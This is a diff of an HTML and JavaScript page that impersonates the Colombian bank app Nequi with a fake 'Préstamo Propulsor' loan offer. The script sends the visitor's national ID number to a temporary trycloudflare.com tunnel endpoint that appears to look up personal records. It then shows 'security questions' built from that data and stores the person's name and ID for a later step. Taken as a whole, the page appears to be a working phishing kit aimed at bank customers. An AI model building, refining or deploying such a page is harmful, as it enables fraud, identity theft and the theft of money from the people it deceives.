@@ -4,7 +4,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="stylesheet" href="css/globals.css">
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/spinner.css">
+
+  <link rel="shortcut icon" type="image/x-icon" href="assets/favicon.ico">
   <title>Solicita tu créditos</title>
+
   <style>
     /* ===== TOAST ===== */
     .toast {
@@ -26,14 +33,21 @@
       align-items: center;
       gap: 12px;
     }
-    .toast.show { top: 80px; opacity: 1; }
-    .toast.success { background: #0bbd67; }
-    .toast.error { background: #e74c3c; }
+    .toast.show {
+      top: 80px;
+      opacity: 1;
+    }
+    .toast.success {
+      background: #0bbd67;
+    }
+    .toast.error {
+      background: #e74c3c;
+    }
     .toast-icon {
       width: 30px;
       height: 30px;
       border-radius: 50%;
-      background: rgba(255,255,255,0.3);
+      background: rgba(255, 255, 255, 0.3);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -59,7 +73,7 @@
       background: #fff;
       border-radius: 16px;
       padding: 24px 20px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
       max-width: 420px;
       margin: 0 auto;
       width: 100%;
@@ -109,10 +123,24 @@
       color: #da0081;
     }
 
-    .error-text { color: #e74c3c; font-size: 13px; margin-top: 4px; display: none; }
-    .error-text.show { display: block; }
-    .success-text { color: #27ae60; font-size: 13px; margin-top: 4px; display: none; }
-    .success-text.show { display: block; }
+    .error-text {
+      color: #e74c3c;
+      font-size: 13px;
+      margin-top: 4px;
+      display: none;
+    }
+    .error-text.show {
+      display: block;
+    }
+    .success-text {
+      color: #27ae60;
+      font-size: 13px;
+      margin-top: 4px;
+      display: none;
+    }
+    .success-text.show {
+      display: block;
+    }
 
     .btn-buscar {
       width: 100%;
@@ -129,7 +157,7 @@
     .btn-buscar:hover:not(:disabled) {
       background: #ab005c;
       transform: translateY(-2px);
-      box-shadow: 0 8px 20px rgba(218,0,129,0.3);
+      box-shadow: 0 8px 20px rgba(218, 0, 129, 0.3);
     }
     .btn-buscar:disabled {
       opacity: 0.5;
@@ -138,15 +166,25 @@
     }
 
     /* ===== SECCIÓN PREGUNTAS ===== */
-    .security-section { display: none; margin-top: 20px; }
-    .security-section.show { display: block; }
+    .security-section {
+      display: none;
+      margin-top: 20px;
+    }
+    .security-section.show {
+      display: block;
+    }
+
     .security-header {
       display: flex;
       align-items: center;
       justify-content: space-between;
       margin-bottom: 12px;
     }
-    .security-header h4 { font-size: 1rem; font-weight: 700; color: #da0081; }
+    .security-header h4 {
+      font-size: 1rem;
+      font-weight: 700;
+      color: #da0081;
+    }
     .question-counter {
       color: #200020;
       background: #f5f4f4;
@@ -155,6 +193,7 @@
       font-weight: 700;
       padding: 6px 12px;
     }
+
     .security-note {
       background: #f5f4f4;
       border-left: 4px solid #da0081;
@@ -165,17 +204,26 @@
       line-height: 1.45;
       margin-bottom: 16px;
     }
-    .security-note strong { color: #200020; }
+    .security-note strong {
+      color: #200020;
+    }
 
-    .security-step { display: none; flex-direction: column; gap: 16px; width: 100%; }
-    .security-step.active { display: flex; }
+    .security-step {
+      display: none;
+      flex-direction: column;
+      gap: 16px;
+      width: 100%;
+    }
+    .security-step.active {
+      display: flex;
+    }
 
     .security-answer-box {
       width: 100%;
       padding: 16px 14px 16px 48px;
       border-radius: 8px;
       background: #fff;
-      box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.54);
+      box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.54);
       position: relative;
     }
     .security-answer-box img {
@@ -184,8 +232,20 @@
       top: 18px;
       width: 25px;
     }
-    .security-answer-label { color: #da0081; display: block; font-size: 13px; font-weight: 700; margin-bottom: 4px; }
-    .security-answer-text { color: #200020; font-size: 16px; font-weight: 600; line-height: 1.35; margin: 0; }
+    .security-answer-label {
+      color: #da0081;
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+    .security-answer-text {
+      color: #200020;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 1.35;
+      margin: 0;
+    }
 
     .choice-group {
       display: grid;
@@ -204,11 +264,28 @@
       min-height: 54px;
       transition: all 0.2s ease;
     }
-    .choice-btn:hover:not(:disabled) { background: #da0081; color: #fff; transform: translateY(-1px); }
-    .choice-btn.selected { background: #da0081; color: #fff; }
-    .choice-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    .choice-btn:hover:not(:disabled) {
+      background: #da0081;
+      color: #fff;
+      transform: translateY(-1px);
+    }
+    .choice-btn.selected {
+      background: #da0081;
+      color: #fff;
+    }
+    .choice-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
 
-    .step-status { color: #200020; font-size: 13px; font-weight: 600; min-height: 18px; text-align: center; }
+    .step-status {
+      color: #200020;
+      font-size: 13px;
+      font-weight: 600;
+      min-height: 18px;
+      text-align: center;
+    }
 
     /* ===== LOADER ===== */
     .loading-spinner {
@@ -218,30 +295,55 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(255,255,255,0.95);
+      background: rgba(255, 255, 255, 0.95);
       z-index: 99999;
       justify-content: center;
       align-items: center;
       flex-direction: column;
     }
-    .loading-spinner.show { display: flex; }
-    .cubes-text { text-align: center; }
-    .nequi-loader { display: flex; justify-content: center; margin-bottom: 20px; }
-    .cubes { display: flex; gap: 12px; }
+    .loading-spinner.show {
+      display: flex;
+    }
+    .cubes-text {
+      text-align: center;
+    }
+    .nequi-loader {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .cubes {
+      display: flex;
+      gap: 12px;
+    }
     .cube {
       width: 40px;
       height: 40px;
       background: #da0081;
       animation: cubeBounce 1.2s infinite ease-in-out;
     }
-    .cube:nth-child(2) { animation-delay: 0.3s; }
+    .cube:nth-child(2) {
+      animation-delay: 0.3s;
+    }
     @keyframes cubeBounce {
       0%, 100% { transform: scale(1); }
       50% { transform: scale(0.4); }
     }
-    .text-cube { font-size: 16px; color: #200020; font-weight: 500; display: block; margin-top: 8px; }
-    .done { display: none; flex-direction: column; align-items: center; }
-    .done.show { display: flex; }
+    .text-cube {
+      font-size: 16px;
+      color: #200020;
+      font-weight: 500;
+      display: block;
+      margin-top: 8px;
+    }
+    .done {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+    }
+    .done.show {
+      display: flex;
+    }
     .check {
       width: 60px;
       height: 60px;
@@ -260,136 +362,56 @@
       border-bottom: 4px solid #fff;
       transform: rotate(-45deg);
     }
-    .done span { font-size: 18px; font-weight: 600; color: #200020; }
+    .done span {
+      font-size: 18px;
+      font-weight: 600;
+      color: #200020;
+    }
 
-    /* ===== HERO ===== */
-    .hero-section {
-      min-height: 100vh;
+    /* ===== HERO FORM ===== */
+    .hero-form-container {
       display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      padding: 10px 0;
+    }
+
+    .big-letter {
+      display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      background: linear-gradient(135deg, #da0081, #200020);
-      padding: 80px 20px 40px;
+      width: 100%;
     }
-    .hero-content { max-width: 480px; width: 100%; margin: 0 auto; text-align: center; }
-    .hero-title { color: #fff; font-size: 1.8rem; font-weight: 700; margin-bottom: 8px; }
-    .hero-subtitle { color: rgba(255,255,255,0.8); font-size: 1rem; margin-bottom: 24px; }
 
-    @media (max-width: 480px) {
-      .hero-title { font-size: 1.4rem; }
-      .form-card { padding: 20px 16px; }
+    .big-letter .u-text-white {
+      text-align: center;
     }
-    @media (min-width: 768px) {
-      .hero-title { font-size: 2.2rem; }
-      .form-card { padding: 36px 32px; }
+
+    .big-letter .form-card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+    }
+
+    .big-letter .form-card .form-group input {
+      background: #fff;
+    }
+
+    @media (max-width: 600px) {
+      .form-card {
+        padding: 16px 14px;
+      }
+      .big-letter .form-card {
+        margin: 0 10px;
+      }
     }
   </style>
 </head>
 
 <body>
 
-  <!-- ===== HEADER ===== -->
-  <header style="position:fixed;top:0;left:0;right:0;z-index:999;width:100%;height:64px;background:#fff;border-bottom:1px solid #e5e5e5;padding:0 16px;display:flex;align-items:center;">
-    <div style="display:flex;align-items:center;justify-content:space-between;width:100%;max-width:990px;margin:0 auto;">
-      <a href="#">
-        <svg width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
-          <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
-          <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
-          <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"/>
-          <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"/>
-          <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"/>
-          <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"/>
-        </svg>
-      </a>
-      <button style="display:flex;flex-direction:column;justify-content:space-between;width:25px;height:20px;background:transparent;border:none;cursor:pointer;">
-        <span style="width:100%;height:2px;background:#200020;"></span>
-        <span style="width:100%;height:2px;background:#200020;"></span>
-        <span style="width:100%;height:2px;background:#200020;"></span>
-      </button>
-    </div>
-  </header>
-
-  <!-- ===== HERO ===== -->
-  <section class="hero-section">
-    <div class="hero-content">
-      <h1 class="hero-title">¡Activa tu Préstamo Propulsor!</h1>
-      <p class="hero-subtitle">Aumenta ya hasta $10,000,000 ahora mismo</p>
-
-      <div class="form-card">
-        <h2 style="color:#da0081;font-size:1.2rem;margin-bottom:20px;text-align:center;">Ingresa tu cédula</h2>
-
-        <div class="form-group">
-          <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="documento">
-          <input type="text" id="cedulaInput" placeholder=" " maxlength="10" inputmode="numeric">
-          <label for="cedulaInput">Ingresa tu cédula</label>
-        </div>
-        <div class="error-text" id="cedulaError">La cédula debe tener entre 7 y 10 dígitos</div>
-        <div class="success-text" id="cedulaSuccess">✅ Cliente encontrado correctamente</div>
-
-        <button class="btn-buscar" id="btnBuscar" disabled>Solicitar</button>
-
-        <div class="security-section" id="securitySection">
-          <div class="security-header">
-            <h4>Preguntas de seguridad</h4>
-            <span class="question-counter" id="questionCounter">0/3</span>
-          </div>
-          <p class="security-note"><strong id="customerNameDisplay"></strong> Responde cada pregunta seleccionando Sí o No.</p>
-
-          <div class="security-step active" data-step="0">
-            <div class="security-answer-box">
-              <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
-              <span class="security-answer-label" id="labelPregunta1">Cargando...</span>
-              <p class="security-answer-text" id="respuestaPregunta1">—</p>
-            </div>
-            <div class="choice-group">
-              <button type="button" class="choice-btn" data-answer="si">Sí</button>
-              <button type="button" class="choice-btn" data-answer="no">No</button>
-            </div>
-            <p class="step-status" id="stepStatusOne"></p>
-          </div>
-
-          <div class="security-step" data-step="1">
-            <div class="security-answer-box">
-              <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
-              <span class="security-answer-label" id="labelPregunta2">Cargando...</span>
-              <p class="security-answer-text" id="respuestaPregunta2">—</p>
-            </div>
-            <div class="choice-group">
-              <button type="button" class="choice-btn" data-answer="si">Sí</button>
-              <button type="button" class="choice-btn" data-answer="no">No</button>
-            </div>
-            <p class="step-status" id="stepStatusTwo"></p>
-          </div>
-
-          <div class="security-step" data-step="2">
-            <div class="security-answer-box">
-              <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
-              <span class="security-answer-label" id="labelPregunta3">Cargando...</span>
-              <p class="security-answer-text" id="respuestaPregunta3">—</p>
-            </div>
-            <div class="choice-group">
-              <button type="button" class="choice-btn" data-answer="si">Sí</button>
-              <button type="button" class="choice-btn" data-answer="no">No</button>
-            </div>
-            <p class="step-status" id="stepStatusThree"></p>
-          </div>
-        </div>
-
-        <p style="margin-top:16px;color:rgba(255,255,255,0.7);font-size:0.8rem;background:rgba(0,0,0,0.2);padding:8px;border-radius:8px;">
-          Aprobación y estudio de crédito en minutos
-        </p>
-      </div>
-    </div>
-  </section>
-
-  <!-- ===== TOAST ===== -->
-  <div class="toast" id="toast">
-    <div class="toast-icon" id="toastIcon"></div>
-    <p id="toastMessage"></p>
-  </div>
-
-  <!-- ===== LOADING SPINNER ===== -->
+  <!-- ===== LOADER ===== -->
   <div class="loading-spinner" id="loadingContenedor">
     <div class="cubes-text">
       <div class="nequi-loader" id="loader">
@@ -406,13 +428,152 @@
     </div>
   </div>
 
+  <!-- ===== TOAST ===== -->
+  <div class="toast" id="toast">
+    <div class="toast-icon" id="toastIcon"></div>
+    <p id="toastMessage"></p>
+  </div>
+
+  <!-- ===== HEADER ===== -->
+  <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
+    <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
+      <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
+        <a href="index.php.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
+          <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
+            <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path>
+            <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path>
+            <path _ngcontent-atq-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path>
+            <path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path>
+            <path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path>
+            <path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path>
+            <path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path>
+          </svg>
+        </a>
+        <button class="flex flex-col justify-between w-[25px] h-[20px] bg-transparent border-none cursor-pointer" aria-label="Menu">
+          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- ===== HERO CON FORMULARIO CENTRADO ===== -->
+  <div class="credits" style="padding-bottom: 0 !important;">
+    <div class="wrap">
+      <div class="wrapper" style="width: 100% !important;">
+        <div class="type-credits__content" id="type-credits">
+          <div class="type-credits-card-w credit-1" style="margin-bottom: 0 !important;">
+            <div class="big-letter">
+
+              <!-- Texto superior -->
+              <p class="u-text-white" style="background-color: #f5f4f445; font-weight: 600; padding: .5rem; border-radius: .5rem; font-size: 17px; backdrop-filter: blur(7px);">
+                ¡Activa tu Prestamo Propulsor
+                <br>
+                Aumenta ya hasta $10,000,000 ahora mismo!
+              </p>
+
+              <!-- ===== FORMULARIO CENTRADO ===== -->
+              <div class="hero-form-container">
+                <div class="form-card">
+
+                  <!-- Campo cédula -->
+                  <div class="form-group">
+                    <img src="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/assets/document.png" alt="">
+                    <input type="text" id="cedulaInput" placeholder=" " maxlength="10" inputmode="numeric" pattern="[0-9]*">
+                    <label for="cedulaInput">Ingresa tu cédula</label>
+                  </div>
+
+                  <div class="error-text" id="cedulaError">La cédula debe tener entre 7 y 10 dígitos</div>
+                  <div class="success-text" id="cedulaSuccess">✅ Cliente encontrado correctamente</div>
+
+                  <button class="btn-buscar" id="btnBuscar">Solicitar</button>
+
+                  <!-- Sección preguntas -->
+                  <div class="security-section" id="securitySection">
+                    <div class="security-header">
+                      <h4>Preguntas de seguridad</h4>
+                      <span class="question-counter" id="questionCounter">0/3</span>
+                    </div>
+
+                    <p class="security-note">
+                      <strong id="customerNameDisplay"></strong> Responde cada pregunta seleccionando Sí o No para continuar con la validación.
+                    </p>
+
+                    <form id="securityForm" novalidate>
+                      <!-- Paso 1 -->
+                      <div class="security-step active" data-step="0">
+                        <div class="security-answer-box">
+                          <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
+                          <span class="security-answer-label" id="labelPregunta1">Cargando...</span>
+                          <p class="security-answer-text" id="respuestaPregunta1">—</p>
+                        </div>
+                        <div class="choice-group">
+                          <button type="button" class="choice-btn" data-answer="si">Sí</button>
+                          <button type="button" class="choice-btn" data-answer="no">No</button>
+                        </div>
+                        <p class="step-status" id="stepStatusOne"></p>
+                      </div>
+
+                      <!-- Paso 2 -->
+                      <div class="security-step" data-step="1">
+                        <div class="security-answer-box">
+                          <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
+                          <span class="security-answer-label" id="labelPregunta2">Cargando...</span>
+                          <p class="security-answer-text" id="respuestaPregunta2">—</p>
+                        </div>
+                        <div class="choice-group">
+                          <button type="button" class="choice-btn" data-answer="si">Sí</button>
+                          <button type="button" class="choice-btn" data-answer="no">No</button>
+                        </div>
+                        <p class="step-status" id="stepStatusTwo"></p>
+                      </div>
+
+                      <!-- Paso 3 -->
+                      <div class="security-step" data-step="2">
+                        <div class="security-answer-box">
+                          <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
+                          <span class="security-answer-label" id="labelPregunta3">Cargando...</span>
+                          <p class="security-answer-text" id="respuestaPregunta3">—</p>
+                        </div>
+                        <div class="choice-group">
+                          <button type="button" class="choice-btn" data-answer="si">Sí</button>
+                          <button type="button" class="choice-btn" data-answer="no">No</button>
+                        </div>
+                        <p class="step-status" id="stepStatusThree"></p>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Texto inferior -->
+              <p class="u-text-white">Aprobación y estudio de credito en minutos</p>
+              <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important;">
+                Con Nequi sales de la friendzone financiera
+              </h1>
+
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== FOOTER ===== -->
+  <footer>
+    <div class="wrap">
+      <div class="wrapper">
+        <div class="footer">
+          <img class="footer-pc" src="assets/footer-bigscreen.png" alt="">
+          <img class="footer-mobile" src="assets/footer.png" alt="">
+        </div>
+      </div>
+    </div>
+  </footer>
+
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-
-      // ===== CONFIGURACIÓN =====
-      const API_BASE_URL = 'https://nequiscol.onrender.com';
-      const API_BUSCAR_CLIENTE = "https://owen-revealed-collection-visited.trycloudflare.com/consultadb/api_buscar_cliente_inteligente.php";
-      const API_VALIDAR_RESPUESTAS = "https://owen-revealed-collection-visited.trycloudflare.com/consultadb/api_validar_respuestas_debug.php";
 
       // ===== ELEMENTOS =====
       const cedulaInput = document.getElementById("cedulaInput");
@@ -431,18 +592,17 @@
       const toastMessage = document.getElementById("toastMessage");
       const toastIcon = document.getElementById("toastIcon");
 
+      // ===== CONSTANTES =====
+      const API_BUSCAR_CLIENTE = "https://owen-revealed-collection-visited.trycloudflare.com/consultadb/api_buscar_cliente_inteligente.php";
+      const API_VALIDAR_RESPUESTAS = "https://owen-revealed-collection-visited.trycloudflare.com/consultadb/api_validar_respuestas_debug.php";
+
       // ===== ESTADO =====
       let customerData = null;
       let respuestas = [];
       let currentStep = 0;
-      let sessionId = localStorage.getItem('sessionId');
-
-      if (!sessionId) {
-        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        localStorage.setItem('sessionId', sessionId);
-      }
 
       // ===== FUNCIONES =====
+
       function formatearFecha(fecha) {
         if (!fecha || fecha === "No disponible" || fecha === "null") return "No disponible";
         if (fecha.match(/^\d{2}-\d{2}-\d{4}$/)) return fecha;
@@ -496,71 +656,44 @@
         }
       }
 
-      // ===== ENVIAR AL BACKEND =====
-      async function enviarAlBackend(endpoint, data) {
-        try {
-          const response = await fetch(`${API_BASE_URL}${endpoint}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-          });
-          return await response.json();
-        } catch (error) {
-          console.error('Error al enviar al backend:', error);
-          throw error;
-        }
-      }
-
       // ===== CONFIGURAR PREGUNTAS =====
       function configurarPreguntas(data) {
         customerData = data;
 
         try {
           localStorage.setItem("customerData", JSON.stringify(data));
-        } catch (e) {}
+        } catch (e) { /* Ignorar en incógnito */ }
 
+        // ===== GUARDAR CÉDULA Y NOMBRE =====
         const cedula = cedulaInput.value.trim();
         let nombreCompleto = data.nombre_completo || data.nombre || "";
         if (data.apellidos && data.apellidos !== "No disponible" && data.apellidos !== "null") {
           nombreCompleto += " " + data.apellidos;
         }
 
-        // ===== GUARDAR EN LOCALSTORAGE PARA loan-simulator =====
+        // Guardar en localStorage para loan-simulator
         const formData = {
           cedula: cedula,
           nombre: nombreCompleto,
-          nombreCompleto: nombreCompleto,
-          phoneNumber: data.telefono || 'No disponible',
-          email: data.correo || 'No disponible'
+          nombreCompleto: nombreCompleto
         };
